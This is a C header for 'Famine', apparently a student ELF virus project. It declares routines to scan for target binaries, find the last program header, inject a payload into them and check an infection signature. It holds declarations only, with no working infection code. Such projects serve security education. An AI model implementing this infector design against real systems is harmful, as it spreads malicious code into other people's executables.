#ifndef _FAMINE_H
# define _FAMINE_H

# include <stddef.h>
# include <stdlib.h>
# include <elf.h>
# include <string.h>
# include <sys/stat.h>
# include <sys/mman.h>
# include <unistd.h>
# include <fcntl.h>

#include <stdio.h>


# define SIGNATURE "Famine version 1.0 (c)oded by ialgac-beeligul"
# define SIGNATURE_SIZE 46

typedef struct  s_file
{
    int     fd;
    char    *head;
    size_t  size;

}               t_file;


Elf64_Phdr  *last_phdr(char *data);
uint64_t    payload(char *data, size_t data_size, char *code, size_t code_size);
int         is_signed(char *data, size_t size);

t_file      file_load(char *path, size_t append_size);
int         file_unload(t_file file);
void        scan_targets(void);

#endif
